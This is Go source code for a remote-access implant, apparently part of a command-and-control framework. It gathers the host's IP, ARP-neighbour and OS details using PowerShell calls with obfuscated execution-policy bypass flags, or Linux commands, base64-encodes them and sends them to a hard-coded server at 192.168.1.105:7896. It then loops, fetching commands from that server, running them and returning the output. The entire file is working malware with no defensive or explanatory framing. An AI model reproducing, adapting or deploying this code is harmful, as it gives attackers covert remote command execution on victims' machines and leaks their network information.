package main

import (
	"bufio"
	"crypto/md5"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type genericDrone struct {
	Action      string
	Status      string
	ID          string
	Hostname    string
	OS          string
	Dronetime   string
	Tasks       string
	Tasksresult string
	IPinfo      string
	Arpinfo     string
	Sysinfo     string
	Sleeptime   int
}

func main() {
	Drone := initDrone()
	Drone = callHome(Drone)
	for {
		time.Sleep(time.Duration(Drone.Sleeptime) * time.Second)
		Drone = callHome(Drone)
		Drone = parseAction(Drone)
	}
}

func initDrone() (Drone genericDrone) {

	Drone = genericDrone{}
	Drone.Action = "Register"
	Drone.Status = "New"
	Drone.Hostname, _ = os.Hostname()
	Drone.Tasks = ""

	if runtime.GOOS == "windows" {
		Drone.OS = "windows"
		IPinfo64, _ := exec.Command("powershell.exe", "-eP", "bYPaSs", "-c", "GeT-NeTIPCoNfIGurAtIOn", "|", "Get-NeTIPAdDREss", "-ADDRessFAmiLY", "IpV4").Output()
		Drone.IPinfo = base64.StdEncoding.EncodeToString(IPinfo64)

		Arpinfo64, _ := exec.Command("powershell.exe", "-EP", "byPAsS", "GET-NetNEiGHBor").Output()
		Drone.Arpinfo = base64.StdEncoding.EncodeToString(Arpinfo64)

		Sysinfo64, _ := exec.Command("powershell.exe", "-Ep", "BYpaSs", "Get-ComputerInfo", "-Property", "osversion, osname").Output()
		Drone.Sysinfo = base64.StdEncoding.EncodeToString(Sysinfo64)

		Drone.ID = Drone.Hostname + Drone.IPinfo
	} else if runtime.GOOS == "linux" {
		Drone.OS = "linux"
		IPinfo64, _ := exec.Command("hostname", "-AI").Output()
		Drone.IPinfo = base64.StdEncoding.EncodeToString(IPinfo64)

		Arpinfo64, _ := exec.Command("ip", "n").Output()
		Drone.Arpinfo = base64.StdEncoding.EncodeToString(Arpinfo64)

		Sysinfo64, _ := exec.Command("uname", "-srm").Output()
		Drone.Sysinfo = base64.StdEncoding.EncodeToString(Sysinfo64)

		Drone.ID = Drone.Hostname + Drone.Sysinfo
	}

	mHash := md5.New()
	io.WriteString(mHash, Drone.ID)
	Drone.ID = fmt.Sprintf("%x", mHash.Sum(nil))

	return Drone
}

func callHome(Drone genericDrone) (respDrone genericDrone) {

	conn, err := net.Dial("tcp", "192.168.1.105:7896")
	if err != nil {
		log.Println(err)
	}

	Drone.Dronetime = time.Now().String()
	marshalDrone, err := json.Marshal(Drone)
	if err != nil {
		log.Println(err)
	}
	conn.Write(marshalDrone)

	response, err := bufio.NewReader(conn).ReadString('}')
	if err != nil {
		log.Println(err)
	}
	b := []byte(response)

	respDrone = genericDrone{}
	err = json.Unmarshal(b, &respDrone)
	if err != nil {
		log.Println(err)
	}
	conn.Close()

	return respDrone

}

func execTasks(Drone genericDrone) (outDrone genericDrone) {
	if strings.Contains(Drone.Tasks, "|-|") == true {
		tasks := strings.Split(Drone.Tasks, "|-|")
		for _, task := range tasks {
			if strings.Contains(task, " ") == true {
				fullTask := strings.Split(task, " ")
				cmd := fullTask[0]
				args := fullTask[1:]
				tasksresult, _ := exec.Command(cmd, args...).Output()
				toB64 := base64.StdEncoding.EncodeToString(tasksresult)
				Drone.Tasksresult += "|" + toB64
			}
		}
	} else {
		if strings.Contains(Drone.Tasks, " ") == true {
			fullTask := strings.Split(Drone.Tasks, " ")
			cmd := fullTask[0]
			args := fullTask[1:]
			tasksresult, _ := exec.Command(cmd, args...).Output()
			toB64 := base64.StdEncoding.EncodeToString(tasksresult)
			Drone.Tasksresult += "|" + toB64
		} else {
			tasksresult, _ := exec.Command(Drone.Tasks).Output()
			toB64 := base64.StdEncoding.EncodeToString(tasksresult)
			Drone.Tasksresult += "|" + toB64
		}
	}
	return Drone
}

func parseAction(Drone genericDrone) (outDrone genericDrone) {

	switch Drone.Action {
	case "WaitTasks":
		Drone.Action = "GetTasks"
		return Drone
	case "ExecTasks":
		Drone = execTasks(Drone)
		Drone.Action = "TaskComplete"
		Drone.Status = "Active"
		return Drone
	}
	return Drone

}
